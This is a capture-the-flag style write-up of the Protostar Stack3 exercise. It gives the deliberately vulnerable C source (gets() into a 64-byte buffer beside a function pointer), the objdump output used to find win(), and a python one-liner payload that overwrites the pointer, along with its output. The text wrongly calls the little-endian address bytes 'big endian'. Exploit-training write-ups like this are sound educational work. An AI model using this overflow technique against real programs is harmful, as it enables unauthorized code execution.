# Stack Three

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

**Hints**
- both gdb and objdump is your friend you determining where the win() function lies in memory.

This level is at /opt/protostar/bin/stack3

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Writeup

In this code we have the buffer of 64 elements and a function pointer upper that.

We can overwrite the function pointer with the pointer of **win()** function to execute it.

To obtain the pointer of **win()** function, we can use **objdump**:

```bash
objdump -d /opt/protostar/bin/stack3
```

This is the **win()** function:

```
08048424 <win>:
 8048424:	55                   	push   %ebp
 8048425:	89 e5                	mov    %esp,%ebp
 8048427:	83 ec 18             	sub    $0x18,%esp
 804842a:	c7 04 24 40 85 04 08 	movl   $0x8048540,(%esp)
 8048431:	e8 2a ff ff ff       	call   8048360 <puts@plt>
 8048436:	c9                   	leave  
 8048437:	c3                   	ret  
```

The address in **big endian** will be:

```
\x24\x84\x04\x08
```

We can inject it with:

```bash
python -c "print('a' * 64 + '\x24\x84\x04\x08')" | /opt/protostar/bin/stack3
```

With this output:

```bash
$ python -c "print('a' * 64 + '\x24\x84\x04\x08')" | /opt/protostar/bin/stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```